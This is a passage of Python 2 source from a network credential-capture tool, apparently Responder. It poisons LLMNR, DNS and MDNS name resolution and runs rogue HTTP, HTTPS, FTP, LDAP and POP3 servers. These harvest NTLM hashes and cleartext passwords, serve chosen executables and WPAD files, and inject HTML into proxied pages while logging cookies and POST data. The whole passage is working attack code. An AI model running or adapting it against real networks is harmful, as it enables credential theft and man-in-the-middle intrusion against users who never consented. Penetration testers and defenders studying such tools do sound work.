                           buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
                           buff.calculate()
                           Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
                           for x in range(1):
                              soc.sendto(str(buff), self.client_address)
                           if PrintLLMNRNBTNS(Log2Filename,Message):
                              print Message
                              logger2.warning(Message)
                           if Is_Finger_On(Finger_On_Off):
                              try:
                                 Finger = RunSmbFinger((self.client_address[0],445))
                                 print '[+] OsVersion is:%s'%(Finger[0])
                                 print '[+] ClientVersion is :%s'%(Finger[1])
                                 logging.warning('[+] OsVersion is:%s'%(Finger[0]))
                                 logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
                              except Exception:
                                 logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                                 pass
                        else:
                           pass
            else:
               pass
        except:
           raise

##################################################################################
#DNS Stuff
##################################################################################
def ParseDNSType(data):
   QueryTypeClass = data[len(data)-4:]
   if QueryTypeClass == "\x00\x01\x00\x01":#If Type A, Class IN, then answer.
      return True
   else:
      return False
 
#DNS Answer packet.
class DNSAns(Packet):
    fields = OrderedDict([
        ("Tid",              ""),
        ("Flags",            "\x80\x10"),
        ("Question",         "\x00\x01"),
        ("AnswerRRS",        "\x00\x01"),
        ("AuthorityRRS",     "\x00\x00"),
        ("AdditionalRRS",    "\x00\x00"),
        ("QuestionName",     ""),
        ("QuestionNameNull", "\x00"),
        ("Type",             "\x00\x01"),
        ("Class",            "\x00\x01"),
        ("AnswerPointer",    "\xc0\x0c"), 
        ("Type1",            "\x00\x01"), 
        ("Class1",           "\x00\x01"), 
        ("TTL",              "\x00\x00\x00\x1e"), #30 secs, dont mess with their cache for too long..
        ("IPLen",            "\x00\x04"),
        ("IP",               "\x00\x00\x00\x00"),
    ])

    def calculate(self,data):
        self.fields["Tid"] = data[0:2]
        self.fields["QuestionName"] = ''.join(data[12:].split('\x00')[:1])
        self.fields["IP"] = inet_aton(OURIP)
        self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))

# DNS Server class.
class DNS(BaseRequestHandler):

    def handle(self):
        data, soc = self.request
        if self.client_address[0] == "127.0.0.1":
           pass
        elif ParseDNSType(data):
           buff = DNSAns()
           buff.calculate(data)
           soc.sendto(str(buff), self.client_address)
           print "DNS Answer sent to: %s "%(self.client_address[0])
           logging.warning('DNS Answer sent to: %s'%(self.client_address[0]))

class DNSTCP(BaseRequestHandler):

    def handle(self):
        try: 
           data = self.request.recv(1024)
           if self.client_address[0] == "127.0.0.1":
              pass
           elif ParseDNSType(data):
              buff = DNSAns()
              buff.calculate(data)
              self.request.send(str(buff))
              print "DNS Answer sent to: %s "%(self.client_address[0])
              logging.warning('DNS Answer sent to: %s'%(self.client_address[0]))

        except Exception:
           pass


##################################################################################
#MDNS Stuff
##################################################################################
class MDNSAns(Packet):
    fields = OrderedDict([
        ("Tid",              "\x00\x00"),
        ("Flags",            "\x84\x00"),
        ("Question",         "\x00\x00"),
        ("AnswerRRS",        "\x00\x01"),
        ("AuthorityRRS",     "\x00\x00"),
        ("AdditionalRRS",    "\x00\x00"),   
        ("AnswerName",       ""),
        ("AnswerNameNull",   "\x00"),    
        ("Type",             "\x00\x01"),  
        ("Class",            "\x00\x01"),
        ("TTL",              "\x00\x00\x00\x78"),##Poison for 2mn.
        ("IPLen",            "\x00\x04"),
        ("IP",               "\x00\x00\x00\x00"),
    ])

    def calculate(self):
        self.fields["IP"] = inet_aton(OURIP)
        self.fields["IPLen"] = struct.pack(">h",len(self.fields["IP"]))

def Parse_MDNS_Name(data):
   data = data[12:]
   NameLen = struct.unpack('>B',data[0])[0]
   Name = data[1:1+NameLen]
   NameLen_ = struct.unpack('>B',data[1+NameLen])[0]
   Name_ = data[1+NameLen:1+NameLen+NameLen_+1]
   return Name+'.'+Name_

def Poisoned_MDNS_Name(data):
   data = data[12:]
   Name = data[:len(data)-5]
   return Name

class MDNS(BaseRequestHandler):

    def handle(self):
       MADDR = "224.0.0.251"
       MPORT = 5353
       data, soc = self.request
       if self.client_address[0] == "127.0.0.1":
          pass
       try:
         if Analyze(AnalyzeMode):
            if Parse_IPV6_Addr(data):
               print '[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data))
               logging.warning('[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data)))

         if RespondToSpecificHost(RespondTo):
            if Analyze(AnalyzeMode) == False:
               if RespondToIPScope(RespondTo, self.client_address[0]):
                  if Parse_IPV6_Addr(data):
                     print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
                     logging.warning('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
                     Name = Poisoned_MDNS_Name(data)
                     MDns = MDNSAns(AnswerName = Name)
                     MDns.calculate()
                     soc.sendto(str(MDns),(MADDR,MPORT))

         if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
            if Parse_IPV6_Addr(data):
               print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
               logging.warning('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
               Name = Poisoned_MDNS_Name(data)
               MDns = MDNSAns(AnswerName = Name)
               MDns.calculate()
               soc.sendto(str(MDns),(MADDR,MPORT))
         else:
            pass
       except Exception:
         raise

##################################################################################
#HTTP Stuff
##################################################################################
from HTTPPackets import *
from HTTPProxy import *

#Parse NTLMv1/v2 hash.
def ParseHTTPHash(data,client):
    LMhashLen = struct.unpack('<H',data[12:14])[0]
    LMhashOffset = struct.unpack('<H',data[16:18])[0]
    LMHash = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
    NthashLen = struct.unpack('<H',data[20:22])[0]
    NthashOffset = struct.unpack('<H',data[24:26])[0]
    NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
    if NthashLen == 24:
       NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       HostNameLen = struct.unpack('<H',data[46:48])[0]
       HostNameOffset = struct.unpack('<H',data[48:50])[0]
       Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
       UserLen = struct.unpack('<H',data[36:38])[0]
       UserOffset = struct.unpack('<H',data[40:42])[0]
       User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
       outfile = os.path.join(ResponderPATH,"HTTP-NTLMv1-Client-"+client+".txt")
       WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
       if PrintData(outfile,User+"::"+Hostname):
          print "[+]HTTP NTLMv1 hash captured from :",client
          print "Hostname is :", Hostname
          print "Complete hash is : ", WriteHash
          WriteData(outfile,WriteHash, User+"::"+Hostname)
       logging.warning('[+]HTTP NTLMv1 hash captured from :%s'%(client))
       logging.warning('[+]HTTP NTLMv1 Hostname is :%s'%(Hostname))
       logging.warning('[+]HTTP NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
       logging.warning('[+]HTTP NTLMv1 Complete hash is :%s'%(WriteHash))

    if NthashLen > 24:
       NthashLen = 64
       DomainLen = struct.unpack('<H',data[28:30])[0]
       DomainOffset = struct.unpack('<H',data[32:34])[0]
       Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       UserLen = struct.unpack('<H',data[36:38])[0]
       UserOffset = struct.unpack('<H',data[40:42])[0]
       User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
       HostNameLen = struct.unpack('<H',data[44:46])[0]
       HostNameOffset = struct.unpack('<H',data[48:50])[0]
       HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
       outfile = os.path.join(ResponderPATH,"HTTP-NTLMv2-Client-"+client+".txt")
       WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
       if PrintData(outfile,User+"::"+Domain):
          print "[+]HTTP NTLMv2 hash captured from :",client
          print "Complete hash is : ", WriteHash
          WriteData(outfile,WriteHash, User+"::"+Domain)
       logging.warning('[+]HTTP NTLMv2 hash captured from :%s'%(client))
       logging.warning('[+]HTTP NTLMv2 User is : %s'%(User))
       logging.warning('[+]HTTP NTLMv2 Domain is :%s'%(Domain))
       logging.warning('[+]HTTP NTLMv2 Hostname is :%s'%(HostName))
       logging.warning('[+]HTTP NTLMv2 Complete hash is :%s'%(WriteHash))

def GrabCookie(data,host):
    Cookie = re.search('(Cookie:*.\=*)[^\r\n]*', data)
    if Cookie:
          CookieStr = "[+]HTTP Cookie Header sent from: %s The Cookie is: \n%s"%(host,Cookie.group(0))
          logging.warning(CookieStr)
          return Cookie.group(0)
    else:
          NoCookies = "No cookies were sent with this request"
          logging.warning(NoCookies)
          return NoCookies

def WpadCustom(data,client):
    Wpad = re.search('(/wpad.dat|/*\.pac)', data)
    if Wpad:
       buffer1 = WPADScript(Payload=WPAD_Script)
       buffer1.calculate()
       return str(buffer1)
    else:
       return False

def WpadForcedAuth(Force_WPAD_Auth):
    if Force_WPAD_Auth == True:
       return True
    if Force_WPAD_Auth == False:
       return False

# Function used to check if we answer with a Basic or NTLM auth. 
def Basic_Ntlm(Basic):
    if Basic == True:
       return IIS_Basic_401_Ans()
    else:
       return IIS_Auth_401_Ans()

def ServeEXE(data,client, Filename):
    Message = "[+]Sent %s file sent to: %s."%(Filename,client)
    print Message
    logging.warning(Message)
    with open (Filename, "rb") as bk:
       data = bk.read()
       bk.close()
       return data

def ServeEXEOrNot(on_off):
    if Exe_On_Off == "ON":
       return True
    if Exe_On_Off == "OFF":
       return False

def ServeEXECAlwaysOrNot(on_off):
    if Exec_Mode_On_Off == "ON":
       return True
    if Exec_Mode_On_Off == "OFF":
       return False

def IsExecutable(Filename):
    exe = re.findall('.exe',Filename)
    if exe:
       return True
    else:
       return False

def GrabURL(data, host):
    GET = re.findall('(?<=GET )[^HTTP]*', data)
    POST = re.findall('(?<=POST )[^HTTP]*', data)
    POSTDATA = re.findall('(?<=\r\n\r\n)[^*]*', data)
    if GET:
          HostStr = "[+]HTTP GET request from : %s. The HTTP URL requested was: %s"%(host, ''.join(GET))
          logging.warning(HostStr)
          print HostStr

    if POST:
          Host3Str = "[+]HTTP POST request from : %s. The HTTP URL requested was: %s"%(host,''.join(POST))
          logging.warning(Host3Str)
          print Host3Str
          if len(''.join(POSTDATA)) >2:
             PostData = '[+]The HTTP POST DATA in this request was: %s'%(''.join(POSTDATA).strip())
             print PostData
             logging.warning(PostData)

#Handle HTTP packet sequence.
def PacketSequence(data,client):
    Ntlm = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
    BasicAuth = re.findall('(?<=Authorization: Basic )[^\\r]*', data)

    if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
       File = config.get('HTTP Server', 'ExecFilename')
       buffer1 = ServerExeFile(Payload = ServeEXE(data,client,File),filename=File)
       buffer1.calculate()
       return str(buffer1)

    if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
       if IsExecutable(FILENAME):
          buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,FILENAME),ContentDiFile=FILENAME)
          buffer1.calculate()
          return str(buffer1)
       else:
          buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,FILENAME))
          buffer1.calculate()
          return str(buffer1)

    if Ntlm:
       packetNtlm = b64decode(''.join(Ntlm))[8:9]
       if packetNtlm == "\x01":
          GrabURL(data,client)
          GrabCookie(data,client)
          r = NTLM_Challenge(ServerChallenge=Challenge)
          r.calculate()
          t = IIS_NTLM_Challenge_Ans()
          t.calculate(str(r))
          buffer1 = str(t)                   
          return buffer1
       if packetNtlm == "\x03":
          NTLM_Auth= b64decode(''.join(Ntlm))
          ParseHTTPHash(NTLM_Auth,client)
          if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
             Message = "[+]WPAD (auth) file sent to: %s"%(client)
             if Verbose:
                print Message
             logging.warning(Message)
             buffer1 = WpadCustom(data,client)
             return buffer1
          else:
             buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
             buffer1.calculate()
             return str(buffer1)

    if BasicAuth:
       GrabCookie(data,client)
       GrabURL(data,client)
       outfile = os.path.join(ResponderPATH,"HTTP-Clear-Text-Password-"+client+".txt")
       if PrintData(outfile,b64decode(''.join(BasicAuth))):
          print "[+]HTTP-User & Password:", b64decode(''.join(BasicAuth))
          WriteData(outfile,b64decode(''.join(BasicAuth)), b64decode(''.join(BasicAuth)))
       logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(BasicAuth))))
       if WpadForcedAuth(Force_WPAD_Auth) and WpadCustom(data,client):
          Message = "[+]WPAD (auth) file sent to: %s"%(client)
          if Verbose:
             print Message
          logging.warning(Message)
          buffer1 = WpadCustom(data,client)
          return buffer1
       else:
          buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
          buffer1.calculate()
          return str(buffer1)

    else:
       return str(Basic_Ntlm(Basic))

#HTTP Server Class
class HTTP(BaseRequestHandler):

    def handle(self):
        try:
           while True:  
              self.request.settimeout(1)
              data = self.request.recv(8092)
              buff = WpadCustom(data,self.client_address[0])
              if buff and WpadForcedAuth(Force_WPAD_Auth) == False:
                 Message = "[+]WPAD (no auth) file sent to: %s"%(self.client_address[0])
                 if Verbose:
                   print Message
                 logging.warning(Message)
                 self.request.send(buff)
              else:
                 buffer0 = PacketSequence(data,self.client_address[0])
                 self.request.send(buffer0)
        except Exception:
           pass#No need to be verbose..


##################################################################################
#HTTP Proxy Stuff
##################################################################################
def HandleGzip(Headers, Content, Payload):
    if len(Content) > 5:
       try:
          unziped = zlib.decompress(Content, 16+zlib.MAX_WBITS)
       except:
          return False
       InjectPayload = Payload
       Len = ''.join(re.findall('(?<=Content-Length: )[^\r\n]*', Headers))
       HasHTML = re.findall('(?<=<html)[^<]*', unziped)
       if HasHTML :
          if Verbose == True:
             print 'Injecting: %s into the original page'%(Payload)  
          Content = unziped.replace("<html", Payload+"\n<html")
          ziped = zlib.compress(Content)
          FinalLen = str(len(ziped))
          Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+FinalLen)
          return Headers+'\r\n\r\n'+ziped
       else:
          return False 
    else:
       return False
   
def InjectData(data):
    Payload = config.get('HTTP Server','HTMLToServe')
    if len(data.split('\r\n\r\n'))>1:
       try:
          Headers, Content = data.split('\r\n\r\n')
       except:
          return data
       RedirectCodes = ['HTTP/1.1 300', 'HTTP/1.1 301', 'HTTP/1.1 302', 'HTTP/1.1 303', 'HTTP/1.1 304', 'HTTP/1.1 305', 'HTTP/1.1 306', 'HTTP/1.1 307']
       if [s for s in RedirectCodes if s in Headers]:
          return data
       if "Content-Encoding: gzip" in Headers:
          Gzip = HandleGzip(Headers,Content, Payload)
          if Gzip:
             return Gzip
          else:
             return data
       if "content-type: text/html" in Headers.lower():
          Len = ''.join(re.findall('(?<=Content-Length: )[^\r\n]*', Headers))
          HasHTML = re.findall('(?<=<html)[^<]*', Content)
          if HasHTML :
             if Verbose == True:
                print 'Injecting: %s into the original page'%(Payload)  
             NewContent = Content.replace("<html", Payload+"\n<html")
             FinalLen = str(len(NewContent))
             Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+FinalLen)
             return Headers+'\r\n\r\n'+NewContent
          else:
             return data

       else:
           return data

    else:
       return data

#Inspired from Tiny HTTP proxy, original work: SUZUKI Hisao.
class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
    __base = BaseHTTPServer.BaseHTTPRequestHandler
    __base_handle = __base.handle
 
    rbufsize = 0

    def handle(self):
        (ip, port) =  self.client_address
        self.__base_handle()

    def _connect_to(self, netloc, soc):
        i = netloc.find(':')
        if i >= 0:
            host_port = netloc[:i], int(netloc[i+1:])
        else:
            host_port = netloc, 80
        try: soc.connect(host_port)
        except socket.error, arg:
            try: msg = arg[1]
            except: msg = arg
            self.send_error(404, msg)
            return 0
        return 1
 
    def do_CONNECT(self):
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if self._connect_to(self.path, soc):
                self.wfile.write(self.protocol_version +
                                 " 200 Connection established\r\n")
                self.wfile.write("Proxy-agent: %s\r\n" % self.version_string())
                self.wfile.write("\r\n")
                try:
                   self._read_write(soc, 300)
                except:
                   pass
        finally:
            soc.close()
            self.connection.close()

    def do_GET(self):
        (scm, netloc, path, params, query, fragment) = urlparse.urlparse(
            self.path, 'http')
        if scm not in ('http') or fragment or not netloc:
            self.send_error(400, "bad url %s" % self.path)
            return
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if scm == 'http':
                if self._connect_to(netloc, soc):
                    soc.send("%s %s %s\r\n" % (self.command,
                                               urlparse.urlunparse(('', '', path,
                                                                    params, query,
                                                                    '')),
                                               self.request_version))
                    if "Cookie" in self.headers:
                       Cookie = self.headers['Cookie']
                    else:
                       Cookie = ''
                    Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s\n"%(self.path, Cookie, self.client_address[0])
                    if Verbose == True:
                       print Message
                    OutFile = os.path.join(ResponderPATH,"HTTPCookies/HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt")
                    WriteData(OutFile,Message, Message)
                    self.headers['Connection'] = 'close'                
                    del self.headers['Proxy-Connection']
                    for key_val in self.headers.items():
                        soc.send("%s: %s\r\n" % key_val)
                    soc.send("\r\n")
                    try:
                      self._read_write(soc, netloc)
                    except:
                      pass

        finally:
            soc.close()
            self.connection.close()
 
    def _read_write(self, soc, netloc='', max_idling=30):
        iw = [self.connection, soc]
        ow = []
        count = 0
        while 1:
            count += 1
            (ins, _, exs) = select.select(iw, ow, iw, 1)
            if exs: 
               break
            if ins:
                for i in ins:
                    if i is soc: 
                       out = self.connection
                       try:
                          if len(config.get('HTTP Server','HTMLToServe'))>5:
                             data = InjectData(i.recv(8192))
                          else:
                             data = i.recv(8192)
                       except:
                          pass
                    else: 
                       out = soc
                       data = i.recv(8192)
                       if self.command == "POST":
                          Message = "POST data was: %s\n"%(data)
                          if Verbose == True:
                             print Message
                          OutFile = os.path.join(ResponderPATH,"HTTPCookies/HTTP-Cookie-request-"+netloc+"-from-"+self.client_address[0]+".txt")
                          WriteData(OutFile,Message, Message)
                    if data:
                        try:
                           out.send(data)
                           count = 0
                        except:
                           pass
            if count == max_idling: 
               break
        return None

 
    do_HEAD = do_GET
    do_POST = do_GET
    do_PUT  = do_GET
    do_DELETE=do_GET
 
 
##################################################################################
#HTTPS Server
##################################################################################
from OpenSSL import SSL
#Parse NTLMv1/v2 hash.
def ParseHTTPSHash(data,client):
    LMhashLen = struct.unpack('<H',data[12:14])[0]
    LMhashOffset = struct.unpack('<H',data[16:18])[0]
    LMHash = data[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
    NthashLen = struct.unpack('<H',data[20:22])[0]
    NthashOffset = struct.unpack('<H',data[24:26])[0]
    NTHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
    if NthashLen == 24:
       print "[+]HTTPS NTLMv1 hash captured from :",client
       logging.warning('[+]HTTPS NTLMv1 hash captured from :%s'%(client))
       NtHash = data[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       HostNameLen = struct.unpack('<H',data[46:48])[0]
       HostNameOffset = struct.unpack('<H',data[48:50])[0]
       Hostname = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
       print "Hostname is :", Hostname
       logging.warning('[+]HTTPS NTLMv1 Hostname is :%s'%(Hostname))
       UserLen = struct.unpack('<H',data[36:38])[0]
       UserOffset = struct.unpack('<H',data[40:42])[0]
       User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "User is :", data[UserOffset:UserOffset+UserLen].replace('\x00','')
       logging.warning('[+]HTTPS NTLMv1 User is :%s'%(data[UserOffset:UserOffset+UserLen].replace('\x00','')))
       outfile = os.path.join(ResponderPATH,"HTTPS-NTLMv1-Client-"+client+".txt")
       WriteHash = User+"::"+Hostname+":"+LMHash+":"+NtHash+":"+NumChal
       WriteData(outfile,WriteHash, User+"::"+Hostname)
       print "Complete hash is : ", WriteHash
       logging.warning('[+]HTTPS NTLMv1 Complete hash is :%s'%(WriteHash))
    if NthashLen > 24:
       print "[+]HTTPS NTLMv2 hash captured from :",client
       logging.warning('[+]HTTPS NTLMv2 hash captured from :%s'%(client))
       NthashLen = 64
       DomainLen = struct.unpack('<H',data[28:30])[0]
       DomainOffset = struct.unpack('<H',data[32:34])[0]
       Domain = data[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       print "Domain is : ", Domain
       logging.warning('[+]HTTPS NTLMv2 Domain is :%s'%(Domain))
       UserLen = struct.unpack('<H',data[36:38])[0]
       UserOffset = struct.unpack('<H',data[40:42])[0]
       User = data[UserOffset:UserOffset+UserLen].replace('\x00','')
       print "User is :", User
       logging.warning('[+]HTTPS NTLMv2 User is : %s'%(User))
       HostNameLen = struct.unpack('<H',data[44:46])[0]
       HostNameOffset = struct.unpack('<H',data[48:50])[0]
       HostName =  data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
       print "Hostname is :", HostName
       logging.warning('[+]HTTPS NTLMv2 Hostname is :%s'%(HostName))
       outfile = os.path.join(ResponderPATH,"HTTPS-NTLMv2-Client-"+client+".txt")
       WriteHash = User+"::"+Domain+":"+NumChal+":"+NTHash[:32]+":"+NTHash[32:]
       WriteData(outfile,WriteHash, User+"::"+Domain)
       print "Complete hash is : ", WriteHash
       logging.warning('[+]HTTPS NTLMv2 Complete hash is :%s'%(WriteHash))

#Handle HTTPS packet sequence.
def HTTPSPacketSequence(data,client):
    a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
    b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
    if a:
       packetNtlm = b64decode(''.join(a))[8:9]
       if packetNtlm == "\x01":
          GrabCookie(data,client)
          r = NTLM_Challenge(ServerChallenge=Challenge)
          r.calculate()
          t = IIS_NTLM_Challenge_Ans()
          t.calculate(str(r))
          buffer1 = str(t)                    
          return buffer1
       if packetNtlm == "\x03":
          NTLM_Auth= b64decode(''.join(a))
          ParseHTTPSHash(NTLM_Auth,client)
          buffer1 = str(IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe')))
          return buffer1
    if b:
       GrabCookie(data,client)
       outfile = os.path.join(ResponderPATH,"HTTPS-Clear-Text-Password-"+client+".txt")
       WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
       print "[+]HTTPS-User & Password:", b64decode(''.join(b))
       logging.warning('[+]HTTPS-User & Password: %s'%(b64decode(''.join(b))))
       buffer1 = str(IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe')))
       return buffer1

    else:
       return str(Basic_Ntlm(Basic))

class SSlSock(ThreadingMixIn, TCPServer):
    def __init__(self, server_address, RequestHandlerClass):
        BaseServer.__init__(self, server_address, RequestHandlerClass)
        ctx = SSL.Context(SSL.SSLv3_METHOD)
        cert = os.path.join(ResponderPATH,config.get('HTTPS Server', 'cert'))
        key =  os.path.join(ResponderPATH,config.get('HTTPS Server', 'key'))
        ctx.use_privatekey_file(key)
        ctx.use_certificate_file(cert)
        self.socket = SSL.Connection(ctx, socket.socket(self.address_family, self.socket_type))
        self.server_bind()
        self.server_activate()

    def shutdown_request(self,request):
        try:
           request.shutdown()
        except:
           pass

class DoSSL(StreamRequestHandler):
    def setup(self):
        self.exchange = self.request
        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

    def handle(self):
        try:
           while True:
              data = self.exchange.recv(8092)
              self.exchange.settimeout(0.5)
              buff = WpadCustom(data,self.client_address[0])
              if buff:
                 self.exchange.send(buff)
              else:
                 buffer0 = HTTPSPacketSequence(data,self.client_address[0])      
                 self.exchange.send(buffer0)
        except:
            pass

##################################################################################
#FTP Stuff
##################################################################################
class FTPPacket(Packet):
    fields = OrderedDict([
        ("Code",           "220"),
        ("Separator",      "\x20"),
        ("Message",        "Welcome"),
        ("Terminator",     "\x0d\x0a"),                     
    ])

#FTP server class.
class FTP(BaseRequestHandler):

    def handle(self):
        try:
          self.request.send(str(FTPPacket()))
          data = self.request.recv(1024)
          if data[0:4] == "USER":
             User = data[5:].replace("\r\n","")
             print "[+]FTP User: ", User
             logging.warning('[+]FTP User: %s'%(User))
             t = FTPPacket(Code="331",Message="User name okay, need password.")
             self.request.send(str(t))
             data = self.request.recv(1024)
          if data[0:4] == "PASS":
             Pass = data[5:].replace("\r\n","")
             Outfile = os.path.join(ResponderPATH,"FTP-Clear-Text-Password-"+self.client_address[0]+".txt")
             WriteData(Outfile,User+":"+Pass, User+":"+Pass)
             print "[+]FTP Password is: ", Pass
             logging.warning('[+]FTP Password is: %s'%(Pass))
             t = FTPPacket(Code="530",Message="User not logged in.")
             self.request.send(str(t))
             data = self.request.recv(1024)
          else :
             t = FTPPacket(Code="502",Message="Command not implemented.")
             self.request.send(str(t))
             data = self.request.recv(1024)
        except Exception:
           pass

##################################################################################
#LDAP Stuff
##################################################################################
from LDAPPackets import *

def ParseSearch(data):
    Search1 = re.search('(objectClass)', data)
    Search2 = re.search('(?i)(objectClass0*.*supportedCapabilities)', data)
    Search3 = re.search('(?i)(objectClass0*.*supportedSASLMechanisms)', data)
    if Search1:
       return str(LDAPSearchDefaultPacket(MessageIDASNStr=data[8:9]))
    if Search2:
       return str(LDAPSearchSupportedCapabilitiesPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))
    if Search3:
       return str(LDAPSearchSupportedMechanismsPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))

def ParseLDAPHash(data,client):
    SSPIStarts = data[42:]
    LMhashLen = struct.unpack('<H',data[54:56])[0]
    if LMhashLen > 10:
       LMhashOffset = struct.unpack('<H',data[58:60])[0]
       LMHash = SSPIStarts[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
       NthashLen = struct.unpack('<H',data[64:66])[0]
       NthashOffset = struct.unpack('<H',data[66:68])[0]
       NtHash = SSPIStarts[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
       DomainLen = struct.unpack('<H',data[72:74])[0]
       DomainOffset = struct.unpack('<H',data[74:76])[0]
       Domain = SSPIStarts[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
       UserLen = struct.unpack('<H',data[80:82])[0]
       UserOffset = struct.unpack('<H',data[82:84])[0]
       User = SSPIStarts[UserOffset:UserOffset+UserLen].replace('\x00','')
       writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
       Outfile = os.path.join(ResponderPATH,"LDAP-NTLMv1-"+client+".txt")
       WriteData(Outfile,writehash,User+"::"+Domain)
       print "[LDAP] NTLMv1 complete hash is :", writehash
       logging.warning('[LDAP] NTLMv1 complete hash is :%s'%(writehash))
    if LMhashLen <2 :
       Message = '[+]LDAP Anonymous NTLM authentication, ignoring..'
       print Message
       logging.warning(Message)

def ParseNTLM(data,client):
    Search1 = re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data)
    Search2 = re.search('(NTLMSSP\x00\x03\x00\x00\x00)', data)
    if Search1:
       NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=data[8:9],NTLMSSPNtServerChallenge=Challenge)
       NTLMChall.calculate()
       return str(NTLMChall)
    if Search2:
       ParseLDAPHash(data,client)

def ParseLDAPPacket(data,client):
    if data[1:2] == '\x84':
       PacketLen = struct.unpack('>i',data[2:6])[0]
       MessageSequence = struct.unpack('<b',data[8:9])[0]
       Operation = data[9:10]
       sasl = data[20:21]
       OperationHeadLen = struct.unpack('>i',data[11:15])[0]
       LDAPVersion = struct.unpack('<b',data[17:18])[0]
       if Operation == "\x60":
          UserDomainLen = struct.unpack('<b',data[19:20])[0]
          UserDomain = data[20:20+UserDomainLen]
          AuthHeaderType = data[20+UserDomainLen:20+UserDomainLen+1]
          if AuthHeaderType == "\x80":
             PassLen = struct.unpack('<b',data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
             Password = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]
             print '[LDAP]Clear Text User & Password is:', UserDomain+":"+Password
             outfile = os.path.join(ResponderPATH,"LDAP-Clear-Text-Password-"+client+".txt")
             WriteData(outfile,'[LDAP]User: %s Password: %s'%(UserDomain,Password),'[LDAP]User: %s Password: %s'%(UserDomain,Password))
             logging.warning('[LDAP]User: %s Password: %s'%(UserDomain,Password))
          if sasl == "\xA3":
             buff = ParseNTLM(data,client)
             return buff
       elif Operation == "\x63":
          buff = ParseSearch(data)
          return buff
       else:
          print '[LDAP]Operation not supported'

#LDAP Server Class
class LDAP(BaseRequestHandler):

    def handle(self):
        try:
           while True:
              self.request.settimeout(0.5)
              data = self.request.recv(8092)
              buffer0 = ParseLDAPPacket(data,self.client_address[0])
              if buffer0:
                 self.request.send(buffer0)
        except Exception:
           pass #No need to print timeout errors.

##################################################################################
#POP3 Stuff
##################################################################################
class POPOKPacket(Packet):
    fields = OrderedDict([
        ("Code",           "+OK"),
        ("CRLF",      "\r\n"),                    
    ])

#POP3 server class.
class POP(BaseRequestHandler):

    def handle(self):
        try:
          self.request.send(str(POPOKPacket()))
          data = self.request.recv(1024)
          if data[0:4] == "USER":
             User = data[5:].replace("\r\n","")
             logging.warning('[+]POP3 User: %s'%(User))
             t = POPOKPacket()
             self.request.send(str(t))
             data = self.request.recv(1024)
          if data[0:4] == "PASS":
             Pass = data[5:].replace("\r\n","")
